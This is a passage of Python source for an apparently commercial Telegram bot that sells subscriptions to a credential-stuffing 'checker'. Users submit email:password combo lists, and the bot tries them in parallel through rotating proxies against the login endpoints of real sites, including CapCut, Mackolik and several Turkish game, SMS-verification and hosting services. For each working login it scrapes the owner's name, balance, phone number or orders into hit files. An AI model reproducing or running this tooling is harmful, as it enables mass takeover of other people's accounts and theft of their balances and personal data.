  plan = CHECKER_SUB_PLANS.get(plan_key)
  if not plan:
    return False, "Gecersiz plan", None
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  mode = "gift" if str(mode) == "gift" else "self"
  if mode == "self" and has_checker_sub(uid):
    st = checker_sub_status_text(uid).replace("**", "")
    return False, "Zaten aktif aboneligin var. Bitmeden kendine yeniden alamazsin.\n%s\nHediye kodu uretebilirsin." % st, None
  price = float(plan["tl"])
  bal = float(user_balances.get(uid, 0) or 0)
  if bal < price:
    return False, "Yetersiz bakiye. Gerekli: %.0f TL | Senin: %.2f TL" % (price, bal), None
  user_balances[uid] = bal - price
  try:
    add_balance_history(uid, "checker_sub", -price, "%s:%s" % (plan_key, mode))
  except Exception:
    pass
  if mode == "gift":
    code, title = create_premium_gift_code(uid, plan_key, via="balance", custom_code=custom_code)
    if not code:
      user_balances[uid] = bal
      return False, str(title or "Kod uretilemedi"), None
    try:
      sub_purchase_log.append({
        "uid": uid, "plan": plan_key, "via": "balance_gift",
        "tl": price, "stars": 0, "ts": time.time(),
        "time_str": get_current_time_str(),
      })
      save_data()
    except Exception:
      pass
    try:
      notify_admins_checker_sub(uid, plan_key, via="balance_gift")
    except Exception:
      pass
    return True, "Hediye kodu: paket %s" % title, code
  ok, msg = grant_checker_sub(uid, plan_key, via="balance")
  if not ok:
    user_balances[uid] = bal
    return False, msg, None
  return True, msg, None

def send_checker_sub_star_invoice(chat_id, user_id, plan_key, mode="self"):
  plan = CHECKER_SUB_PLANS.get(plan_key)
  if not plan:
    return False
  mode = "gift" if str(mode) == "gift" else "self"
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if mode == "self" and has_checker_sub(uid):
    try:
      bot.send_message(chat_id, "Zaten aktif aboneligin var. Kendine alamazsin; hediye kodu sec.")
    except Exception:
      pass
    return False
  stars = int(plan["stars"])
  title = plan["title"]
  payload = "chksub_%s_%s_%s_%s" % (user_id, plan_key, mode, int(time.time()))
  prices = [types.LabeledPrice(label="Checker %s" % title, amount=stars)]
  try:
    bot.send_invoice(
      chat_id,
      title="Checker · %s" % title,
      description="%s abonelik (%s) %s yildiz" % (BOT_BRAND, mode, stars),
      invoice_payload=payload,
      provider_token="",
      currency="XTR",
      prices=prices,
      start_parameter="chksub%s" % plan_key,
    )
    bot.send_message(
      chat_id,
      "Fatura: %s | %s | %s yildiz" % (title, ("Hediye kod" if mode == "gift" else "Kendin"), stars),
    )
    return True
  except Exception as e:
    log_error("chksub_invoice", e)
    try:
      bot.send_message(chat_id, "Fatura hatasi: %s" % e)
    except Exception:
      pass
    return False

def user_did_log_today(user_id):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  last = float(log_search_last.get(uid) or log_search_last.get(str(uid)) or 0)
  if last <= 0:
    return False
  try:
    return datetime.fromtimestamp(last).strftime("%Y-%m-%d") == datetime.now().strftime("%Y-%m-%d")
  except Exception:
    return False

def quest_card_status(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  claimed = quest_card_claims.get(uid) == today or quest_card_claims.get(str(uid)) == today
  cin = has_checked_in_today(uid)
  logok = user_did_log_today(uid)
  rew = float(globals().get("QUEST_CARD_REWARD", 5.0) or 5.0)
  return claimed, cin, logok, rew

def quest_card_text(user_id):
  claimed, cin, logok, rew = quest_card_status(user_id)
  if claimed:
    return "Gorev: tamamlandi (+%.0f TL)" % rew
  return "Gorev: check-in [%s] + log [%s] = +%.0f TL" % (
    "OK" if cin else "-", "OK" if logok else "-", rew)

def claim_quest_card(user_id):
  claimed, cin, logok, rew = quest_card_status(user_id)
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if claimed:
    return False, "Bugun gorev odulu alindi."
  if not cin or not logok:
    return False, "Once check-in + 1 log ara, sonra odul al."
  today = datetime.now().strftime("%Y-%m-%d")
  quest_card_claims[uid] = today
  try:
    user_balances[uid] = float(user_balances.get(uid, 0) or 0) + rew
    add_balance_history(uid, "quest_card", rew, "gunluk gorev")
    save_data()
  except Exception as e:
    return False, str(e)
  try:
    bump_activity(uid, 5)
  except Exception:
    pass
  return True, "Gorev tamam +%.0f TL eklendi." % rew

def sub_revenue_summary(days=7):
  now = time.time()
  cutoff = now - days * 86400
  rows = [x for x in (sub_purchase_log or []) if isinstance(x, dict) and float(x.get("ts") or 0) >= cutoff]
  tl_bal = stars = 0.0
  n_bal = n_star = n_admin = 0
  by_plan = {}
  for r in rows:
    via = str(r.get("via") or "")
    plan = str(r.get("plan") or "?")
    by_plan[plan] = by_plan.get(plan, 0) + 1
    if via == "balance":
      tl_bal += float(r.get("tl") or 0)
      n_bal += 1
    elif via == "stars":
      stars += float(r.get("stars") or 0)
      n_star += 1
    else:
      n_admin += 1
  lines = [
    "Abonelik geliri (son %d gun)" % days,
    "Toplam: %d | Bakiye: %d (%.0f TL) | Yildiz: %d (%.0f) | Admin: %d" % (
      len(rows), n_bal, tl_bal, n_star, stars, n_admin),
    "Paketler:",
  ]
  for k, p in CHECKER_SUB_PLANS.items():
    lines.append("- %s: %d" % (p.get("title") or k, by_plan.get(k, 0)))
  active = 0
  for _uid, info in list((checker_subs or {}).items()):
    if not isinstance(info, dict):
      continue
    until = float(info.get("until") or 0)
    if until <= 0 or until > now:
      active += 1
  lines.append("Aktif abone: %d" % active)
  return "\n".join(lines)

def process_sub_expiry_reminders():
  global sub_remind_sent
  now = time.time()
  today = datetime.now().strftime("%Y-%m-%d")
  for uid, info in list((checker_subs or {}).items()):
    try:
      if not isinstance(info, dict):
        continue
      until = float(info.get("until") or 0)
      if until <= 0:
        continue
      left = until - now
      if left <= 0 or left > 86400:
        continue
      try:
        u = int(uid)
      except Exception:
        u = uid
      if sub_remind_sent.get(u) == today or sub_remind_sent.get(str(u)) == today:
        continue
      plan = str(info.get("plan") or "")
      title = (CHECKER_SUB_PLANS.get(plan) or {}).get("title") or plan
      h = max(1, int(left // 3600))
      msg = "Abonelik bitmek uzere\n\nPaket: %s\nKalan ~%d saat\nUzatmak icin abonelik menusune gir." % (title, h)
      msg = msg.replace("\\n", "\n")
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("Aboneligi uzat", callback_data="chk_sub_menu"))
      try:
        bot.send_message(u, msg, reply_markup=markup)
        sub_remind_sent[u] = today
      except Exception:
        pass
    except Exception:
      continue
  try:
    save_data()
  except Exception:
    pass

def sub_remind_loop():
  import time as _t
  while True:
    try:
      process_sub_expiry_reminders()
    except Exception as e:
      try:
        log_error("sub_remind_loop", e)
      except Exception:
        pass
    _t.sleep(3600)

def require_checker_sub(chat_id, user_id, message_id=None):
  """Abone degilse uyari + menu. True = devam edebilir."""
  if has_checker_sub(user_id):
    return True
  markup = types.InlineKeyboardMarkup(row_width=1)
  markup.add(types.InlineKeyboardButton("💎 Abonelik Al", callback_data="chk_sub_menu"))
  markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
  msg = (
    "🔒 Checker aboneliği gerekli\n\n"
    "Sınırsız tarama için 1 gün / 7 gün / 30 gün veya ömür boyu paket al.\n"
    "Ödeme: bot bakiyesi veya yıldız."
  )
  try:
    if message_id:
      bot.edit_message_text(msg, chat_id, message_id, reply_markup=markup)
    else:
      bot.send_message(chat_id, msg, reply_markup=markup)
  except Exception:
    try:
      bot.send_message(chat_id, msg, reply_markup=markup)
    except Exception:
      pass
  return False

def ask_checker_speed(chat_id, user_id, combo_text, run_fn, label):
  """Combo sonrasi hiz sor (2-8). run_fn bellek ici saklanir."""
  if not require_checker_sub(chat_id, user_id):
    return
  if not combo_text or not str(combo_text).strip():
    safe_tg(bot.send_message, chat_id, "❌ Boş combo.")
    return
  admin_temp_data[chat_id] = {
    "pending_chk_combo": str(combo_text).strip(),
    "pending_chk_fn": run_fn,
    "pending_chk_label": str(label or "Checker"),
  }
  user_states[chat_id] = "waiting_checker_speed"
  prev = get_checker_workers(user_id)
  msg = (
    f"⚡ **{label}** — Hız seç\n\n"
    f"Thread sayısı (**{CHECKER_SPEED_MIN}–{CHECKER_SPEED_MAX}**)\n"
    f"• **2** = yavaş / güvenli\n"
    f"• **4** = dengeli\n"
    f"• **8** = hızlı\n\n"
    f"Son seçimin: **{prev}**\n"
    f"Butona bas veya sayı yaz.\n"
    f"İptal: /iptal"
  )
  safe_tg(
    bot.send_message,
    chat_id,
    msg,
    reply_markup=_checker_speed_markup(label),
    parse_mode="Markdown",
  )

def _start_pending_checker(chat_id, user_id, workers):
  """Hız seçildikten sonra checker'ı başlat; meşgulse kuyruğa al."""
  meta = admin_temp_data.get(chat_id) or {}
  combo = meta.get("pending_chk_combo")
  run_fn = meta.get("pending_chk_fn")
  label = meta.get("pending_chk_label") or "Checker"
  user_states.pop(chat_id, None)
  admin_temp_data.pop(chat_id, None)
  if not combo or not callable(run_fn):
    safe_tg(bot.send_message, chat_id, "❌ Oturum kayboldu. Combo'yu tekrar gönder.")
    return
  w = set_checker_workers(user_id, workers)
  if _user_has_active_checker(user_id):
    ok, res = enqueue_checker(user_id, label, combo, run_fn, w)
    if ok:
      safe_tg(
        bot.send_message,
        chat_id,
        f"⏳ **Kuyruğa alındı** (sıra: **{res}**)\n"
        f"📄 {label} · ⚡ {w} thread\n"
        f"Önceki tarama bitince otomatik başlar.",
        parse_mode="Markdown",
      )
    else:
      safe_tg(bot.send_message, chat_id, f"❌ {res}")
    return
  safe_tg(
    bot.send_message,
    chat_id,
    f"📄 **{label}** başlıyor...\n⚡ Thread: **{w}**",
    parse_mode="Markdown",
  )
  try:
    threading.Thread(
      target=run_fn,
      args=(chat_id, user_id, str(combo).strip()),
      daemon=True,
    ).start()
  except Exception as e:
    log_error(f"{label}_thread", e)
    safe_tg(bot.send_message, chat_id, f"❌ Başlatılamadı: {e}")

def _launch_checker_job(chat_id, user_id, combo_text, run_fn, label):
  """Combo alındı → kullanıcıya hız sor (2-8) → sonra thread başlat."""
  ask_checker_speed(chat_id, user_id, combo_text, run_fn, label)

def _run_simple_checker(chat_id, user_id, text, job_dict_name, display_name, stop_cb, check_fn, sleep_s=0.5):
  """Generic runner — paralel worker (2-8), 429 korumalı, HIT dosyası."""
  jobs = globals()[job_dict_name]
  if user_id in jobs and not jobs[user_id].get("stop"):
    safe_tg(bot.send_message, chat_id, f"⚠️ Zaten bir {display_name} taraması çalışıyor.", parse_mode="Markdown")
    return
  lines = _parse_combo_lines(text)
  if not lines:
    safe_tg(bot.send_message, chat_id, "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass`", parse_mode="Markdown")
    return
  total = len(lines)
  workers = get_checker_workers(user_id)
  quiet = is_quiet_mode(user_id)
  t0 = time.time()
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id, "workers": workers, "t0": t0, "quiet": quiet}
  jobs[user_id] = job
  msg = None
  if not quiet:
    msg = safe_tg(
      bot.send_message,
      chat_id,
      _generic_checker_progress(display_name, job),
      reply_markup=_job_stop_markup(stop_cb),
      parse_mode="Markdown",
      retries=3,
    )
  else:
    safe_tg(bot.send_message, chat_id, f"🔇 Sessiz mod · **{display_name}** taraniyor ({total} satır, {workers}th)\nBitişte özet + HIT gelir.", parse_mode="Markdown", retries=1)
  if msg is not None:
    try:
      job["msg_id"] = msg.message_id
    except Exception:
      pass
  hits = []
  last_refresh = 0.0
  proxies = get_user_proxies(user_id)
  px_i = [0]
  safe_name = re.sub(r"[^a-zA-Z0-9_]+", "_", display_name.lower())
  live_hits_path = f"{safe_name}_live_{user_id}_{int(time.time())}.txt"
  try:
    open(live_hits_path, "w", encoding="utf-8").close()
  except Exception:
    live_hits_path = None

  def _next_px():
    if not proxies:
      return None
    pxy = proxies[px_i[0] % len(proxies)]
    px_i[0] += 1
    return pxy

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 4.0:
      return
    last_refresh = now
    safe_tg(
      bot.edit_message_text,
      _generic_checker_progress(display_name, job, finished=finished, stopped=stopped),
      chat_id, mid,
      reply_markup=None if (finished or stopped) else _job_stop_markup(stop_cb),
      parse_mode="Markdown",
      retries=1,
    )

  stopped_early = False
  hits_lock = threading.Lock()
  from concurrent.futures import ThreadPoolExecutor, as_completed

  def _one(item):
    if jobs.get(user_id, {}).get("stop"):
      return None
    u, p = item
    try:
      with _ProxySessionPatch(_next_px()):
        ok, status, detail = check_fn(u, p)
    except Exception as e:
      log_error(f"{display_name}_line", e)
      ok, status, detail = False, "ERROR", str(e)[:80]
    return (u, p, ok, status, detail)

  try:
    base_sleep = max(0.15, float(sleep_s) * (4.0 / max(1, workers)))
  except Exception:
    base_sleep = 0.35

  try:
    with ThreadPoolExecutor(max_workers=workers) as ex:
      futs = [ex.submit(_one, item) for item in lines]
      done_n = 0
      for fut in as_completed(futs):
        if jobs.get(user_id, {}).get("stop"):
          stopped_early = True
          try:
            ex.shutdown(wait=False, cancel_futures=True)
          except Exception:
            pass
          break
        res = None
        try:
          res = fut.result()
        except Exception as e:
          log_error(f"{display_name}_fut", e)
          res = None
        done_n += 1
        with hits_lock:
          job["checked"] = done_n
          if res:
            u, p, ok, status, detail = res
            if status == "SUCCESS":
              job["hits"] = int(job.get("hits") or 0) + 1
              line = f"{u}:{p} | {detail}"
              hits.append(line)
              if live_hits_path:
                try:
                  with open(live_hits_path, "a", encoding="utf-8") as hf:
                    hf.write(line + "\n")
                except Exception:
                  pass
            elif status == "BAD":
              job["bads"] = int(job.get("bads") or 0) + 1
            else:
              job["errors"] = int(job.get("errors") or 0) + 1
          jobs[user_id] = job
        _refresh(force=(done_n % max(10, workers * 3) == 0))
        if base_sleep > 0 and done_n < total and not jobs.get(user_id, {}).get("stop"):
          time.sleep(base_sleep / max(1, workers))
  except Exception as e:
    log_error(f"{display_name}_pool", e)
  stopped_early = stopped_early or bool(jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  safe_tg(
    bot.send_message,
    chat_id,
    f"📡 **{display_name} {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
    f"📦 {checked}/{total} · ✅ HIT **{len(hits)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
    parse_mode="Markdown",
    retries=3,
  )
  jobs.pop(user_id, None)
  if not hits:
    try:
      el = time.time() - t0
      safe_tg(bot.send_message, chat_id, build_scan_summary(display_name, user_id, total, checked, 0, int(job.get("bads") or 0), int(job.get("errors") or 0), workers, el, None, stopped_early), parse_mode="Markdown", retries=1)
    except Exception:
      pass
    safe_tg(bot.send_message, chat_id, "📭 HIT çıkmadı." + (" (yarıda)" if stopped_early else ""), retries=2)
    try:
      season_bump(user_id, hits=0, checks=int(checked or 0))
    except Exception:
      pass
    try:
      on_checker_job_finished(user_id)
    except Exception:
      pass
    try:
      if live_hits_path and os.path.exists(live_hits_path):
        os.remove(live_hits_path)
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, display_name, hits, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early, elapsed_sec=time.time()-t0, workers=workers, bads=int(job.get("bads") or 0), errors=int(job.get("errors") or 0))
  try:
    if live_hits_path and os.path.exists(live_hits_path):
      os.remove(live_hits_path)
  except Exception:
    pass

def run_smpanel_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_smpanel_jobs", "SMPANEL", "smpanel_stop", smpanel_check_account)

def run_worldofsmm_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_worldofsmm_jobs", "WORLDOFSMM", "worldofsmm_stop", worldofsmm_check_account)

def run_jap_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_jap_jobs", "JUSTANOTHERPANEL", "jap_stop", jap_check_account)

def run_vpazari_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_vpazari_jobs", "VPAZARI", "vpazari_stop", vpazari_check_account)


def predunyam_check_account(email, password):
  base = "https://www.predunyam.net"
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept-Language": "tr-TR,tr;q=0.9",
  })
  try:
    r = session.get(f"{base}/hesap", timeout=15)
    m = re.search(r'name="csrf_test_name"\s+value="([^"]+)"', r.text or "")
    if not m:
      return False, "ERROR", "CSRF yok"
    csrf = m.group(1)
    resp = session.post(
      f"{base}/login/loginClient",
      data={
        "csrf_test_name": csrf,
        "mail": email,
        "password": password,
        "btn btn-primary w-100": "Giriş Yap",
      },
      headers={
        "content-type": "application/x-www-form-urlencoded",
        "origin": base,
        "referer": f"{base}/hesap",
      },
      allow_redirects=False,
      timeout=15,
    )
    refresh = resp.headers.get("refresh", "") or ""
    loc = resp.headers.get("Location", "") or ""
    redir = ""
    if "url=" in refresh:
      redir = refresh.split("url=", 1)[1].strip()
    elif loc:
      redir = loc.strip()
    if not redir:
      return False, "BAD", "redirect yok"
    if not redir.startswith("http"):
      redir = base + redir
    if "/client" in redir or "/hesap" in redir:
      page = session.get(redir, timeout=15)
      html = page.text or ""
      if 'name="mail"' in html and ("name=\"password\"" in html or 'type="password"' in html):
        return False, "BAD", "login form"
      email_c = re.search(r'<div class="mail">(.*?)</div>', html)
      user_c = re.search(r'<span style="font-size: 13px;">(.*?)</span>', html)
      bal_c = re.search(r'<div class="money">(.*?)</div>', html)
      rows = re.findall(r'<tr[^>]*>', html)
      orders = max(0, len(rows) - 1)
      detail = (
        f"User:{(user_c.group(1).strip() if user_c else 'N/A')} | "
        f"Bakiye:{(bal_c.group(1).strip() if bal_c else 'N/A')} | "
        f"Sipariş:{orders}"
      )
      return True, "SUCCESS", detail
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def mackolik_check_account(email, password):
  try:
    r = requests.post(
      "https://auth-api.mackolikfeeds.com/login",
      json={"loginId": email, "password": password},
      headers={
        "Origin": "https://www.mackolik.com",
        "Referer": "https://www.mackolik.com/",
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
        "Accept": "*/*",
      },
      timeout=20,
    )
    text = r.text or ""
    if r.status_code != 200 or '"token":"' not in text:
      if '"status":-1' in text:
        return False, "BAD", "hatalı"
      if '"status":4' in text:
        return False, "BAD", "bloke"
      return False, "BAD", "login fail"
    token = text.split('"token":"')[1].split('"')[0]
    info = requests.get(
      "https://auth-api.mackolikfeeds.com/my-account",
      headers={
        "Authorization": f"Bearer {token}",
        "Origin": "https://www.mackolik.com",
        "Referer": "https://www.mackolik.com/",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
      },
      timeout=15,
    ).json()
    uname = info.get("username") or "Yok"
    ad = info.get("firstName") or ""
    soy = info.get("lastName") or ""
    onay = "Evet" if info.get("isVerified") else "Hayır"
    return True, "SUCCESS", f"User:{uname} | Ad:{ad} {soy} | Onaylı:{onay}"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def ozygame_check_account(email, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://ozygame.com",
    "Referer": "https://ozygame.com/hesap",
    "Content-Type": "application/x-www-form-urlencoded",
  })
  try:
    r = session.get("https://ozygame.com/hesap", timeout=12)
    csrf = session.cookies.get("csrf_cookie_name")
    if not csrf:
      m = re.search(r'name="csrf_test_name"\s+value="([^"]+)"', r.text or "")
      csrf = m.group(1) if m else None
    if not csrf:
      return False, "ERROR", "CSRF yok"
    resp = session.post(
      "https://ozygame.com/login/loginClient",
      data={"csrf_test_name": csrf, "mail": email, "password": password},
      timeout=12,
      allow_redirects=False,
    )
    refresh = resp.headers.get("Refresh", "") or ""
    loc = resp.headers.get("Location", "") or ""
    ok = ("/client" in refresh or "/panel" in refresh or "/client" in loc or "/panel" in loc
        or "/client" in (resp.url or "") or "/panel" in (resp.url or ""))
    if not ok:
      return False, "BAD", "login fail"
    page = session.get("https://ozygame.com/client", timeout=12)
    html = page.text or ""
    bal = re.search(r'([\d,.]+)\s*(?:TL|₺)', html)
    user = re.search(r'user-name[^>]*>([^<]+)', html, re.I)
    detail = f"User:{(user.group(1).strip() if user else 'N/A')} | Bakiye:{(bal.group(0) if bal else 'N/A')}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def capcut_check_account(email, password):
  try:
    session = requests.Session()
    url = ("https://www.capcut.com/passport/web/email/login/"
         "?aid=348188&account_sdk_source=web&passport_jssdk_version=1.0.7-beta.2&language=en")
    headers = {
      "host": "www.capcut.com",
      "origin": "https://www.capcut.com",
      "referer": "https://www.capcut.com/login",
      "content-type": "application/x-www-form-urlencoded",
      "User-Agent": "Mozilla/5.0",
      "Accept": "application/json, text/plain, */*",
    }
    data = f"mix_mode=1&email={email}&password={password}&fixed_mix_mode=1"
    r = session.post(url, data=data, headers=headers, timeout=12)
    t = r.text or ""
    if '"message":"success"' in t or '"user_id"' in t or '"app_id"' in t:
      nick = None
      m = re.search(r'"screen_name":"([^"]+)"', t)
      if m:
        nick = m.group(1)
      return True, "SUCCESS", f"Nick:{nick or 'N/A'}"
    if "doesn't match" in t or '"error_code":1009' in t or '"message":"error"' in t:
      return False, "BAD", "login fail"
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def verisunucu_check_account(email, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://musteri.verisunucu.net",
    "Referer": "https://musteri.verisunucu.net/login",
    "Content-Type": "application/x-www-form-urlencoded",
  })
  try:
    r = session.get("https://musteri.verisunucu.net/login", timeout=12)
    m = re.search(r'name="token"\s+value="([^"]+)"', r.text or "")
    token = m.group(1) if m else None
    if not token:
      return False, "ERROR", "token yok"
    resp = session.post(
      "https://musteri.verisunucu.net/login",
      data={"token": token, "username": email, "password": password},
      timeout=12,
      allow_redirects=False,
    )
    loc = resp.headers.get("Location", "") or ""
    if resp.status_code == 302 and ("clientarea" in loc or "dashboard" in loc):
      page = session.get("https://musteri.verisunucu.net/clientarea", timeout=12)
      html = page.text or ""
      name = re.search(r'class="member"[^>]*>.*?<h3[^>]*>([^<]+)', html, re.S)
      kredi = re.search(r'KREDİ BAKİYESİ.*?([\d,.]+)\s*(?:TL|₺)', html, re.I | re.S)
      detail = (
        f"Ad:{(name.group(1).strip() if name else 'N/A')} | "
        f"Kredi:{(kredi.group(1)+' TL' if kredi else 'N/A')}"
      )
      return True, "SUCCESS", detail
    low = (resp.text or "").lower()
    if "hatalı" in low or "hata" in low:
      return False, "BAD", "login fail"
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def smsonay_check_account(email, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://smsonayservisi.com",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "*/*",
  })
  try:
    session.get("https://smsonayservisi.com", timeout=10)
    r = session.post(
      "https://smsonayservisi.com/ajax/login",
      data={"email": email, "password": password},
      timeout=12,
    )
    ok = False
    try:
      j = r.json()
      ok = bool(j.get("success") is True)
    except Exception:
      ok = "başarılı" in (r.text or "").lower() or "success" in (r.text or "").lower()
    if not ok:
      return False, "BAD", "login fail"
    page = session.get("https://smsonayservisi.com/panel/buy", timeout=12)
    html = page.text or ""
    bal = re.search(r'([\d,.]+)\s*(?:TL|₺)', html)
    user = re.search(r'fw-bolder[^>]*>([^<]+)', html, re.I)
    detail = f"User:{(user.group(1).strip() if user else 'N/A')} | Bakiye:{(bal.group(0) if bal else 'N/A')}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def buraksmsonay_check_account(email, password):
  """buraksmsonay.com.tr panel login checker."""
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; SM-A057F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Origin": "https://buraksmsonay.com.tr",
    "Referer": "https://buraksmsonay.com.tr/panel/login",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  })
  try:
    try:
      session.get("https://buraksmsonay.com.tr/panel/login", timeout=12)
    except Exception:
      pass
    r = session.post(
      "https://buraksmsonay.com.tr/panel/do_login",
      data={"email_username": email, "password": password},
      timeout=15,
    )
    bad_msg = "hatalı girdiniz"
    body = (r.text or "")
    try:
      j = r.json() if r.content else {}
    except Exception:
      j = {}
    msg = str(j.get("message") or j.get("msg") or "")
    if bad_msg in msg.lower() or bad_msg in body.lower():
      return False, "BAD", "login fail"
    if r.status_code not in (200, 302):
      return False, "ERROR", f"HTTP {r.status_code}"
    ok_hints = (
      j.get("status") in (True, 1, "success", "ok", "1"),
      j.get("success") in (True, 1, "true", "1"),
      "başarı" in msg.lower(),
      "success" in msg.lower(),
      "panel" in (j.get("redirect") or j.get("url") or "").lower(),
    )
    if any(ok_hints):
      detail = "login OK"
      try:
        page = session.get("https://buraksmsonay.com.tr/panel", timeout=12)
        html = page.text or ""
        bal = re.search(r'([\d.,]+)\s*(?:TL|₺)', html)
        if bal:
          detail = f"Bakiye:{bal.group(0)}"
      except Exception:
        pass
      return True, "SUCCESS", detail
    if r.status_code == 200 and bad_msg not in body.lower():
      if j or "html" not in (r.headers.get("Content-Type") or "").lower():
        return True, "SUCCESS", "login OK (no error msg)"
      if "do_login" in body or "email_username" in body or "şifre" in body.lower():
        return False, "BAD", "login page"
      return True, "SUCCESS", "login OK"
    return False, "BAD", "login fail"
  except requests.exceptions.Timeout:
    return False, "ERROR", "timeout"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def run_buraksmsonay_check_and_send(chat_id, user_id, text):
  _run_simple_checker(
    chat_id, user_id, text,
    "active_buraksmsonay_jobs", "BURAKSMSONAY", "buraksmsonay_stop",
    buraksmsonay_check_account, 1.0,
  )

def fenix_check_account(email, password):
  session = requests.Session()
  session.headers.update({"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
  try:
    boundary = "----WebKitFormBoundaryDnUrDJx5xreaCkR9"
    body = (
      f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n"
      f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n"
      f"--{boundary}--"
    )
    r = session.post(
      "https://fenixoyun.com/giris",
      data=body,
      headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
      allow_redirects=False,
      timeout=12,
    )
    loc = r.headers.get("Location", "") or ""
    if r.status_code not in (301, 302) or "hesap" not in loc:
      return False, "BAD", "login fail"
    page = session.get("https://fenixoyun.com/hesap", timeout=12)
    html = page.text or ""
    name = re.search(r'user-name"><span>([^<]+)</span>', html)
    bal = re.search(r'<h2>([^<]+)</h2>', html)
    detail = f"Ad:{(name.group(1).strip() if name else 'N/A')} | Bakiye:{(bal.group(1).strip() if bal else 'N/A')}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def ezglobal_check_account(email, password):
  session = requests.Session()
  session.headers.update({"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
  try:
    data = f"s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={email}&sifre={password}&ajtip=eval"
    r = session.post(
      "https://www.ezglobalyazilim.com/ajax.php",
      data=data,
      headers={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.ezglobalyazilim.com",
        "Referer": "https://www.ezglobalyazilim.com/uyelik.html",
      },
      timeout=12,
    )
    t = r.text or ""
    if "Üye girişi başarılı" not in t:
      if "hatalıdır" in t or "errorCode" in t:
        return False, "BAD", "login fail"
      return False, "BAD", "login fail"
    page = session.get("https://www.ezglobalyazilim.com/hesabim.html", timeout=12)
    html = page.text or ""
    ad = re.search(r'id="gb_ad"[^>]*value="([^"]*)"', html)
    soy = re.search(r'id="gb_soyad"[^>]*value="([^"]*)"', html)
    tel = re.search(r'id="gb_telefon"[^>]*value="([^"]*)"', html)
    bal = re.search(r'<li class="bakiye">([^<]+)</li>', html)
    detail = (
      f"Ad:{(ad.group(1) if ad else '')} {(soy.group(1) if soy else '')} | "
      f"Tel:{(tel.group(1) if tel else 'Yok')} | "
      f"Bakiye:{(bal.group(1).strip() if bal else 'N/A')}"
    )
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
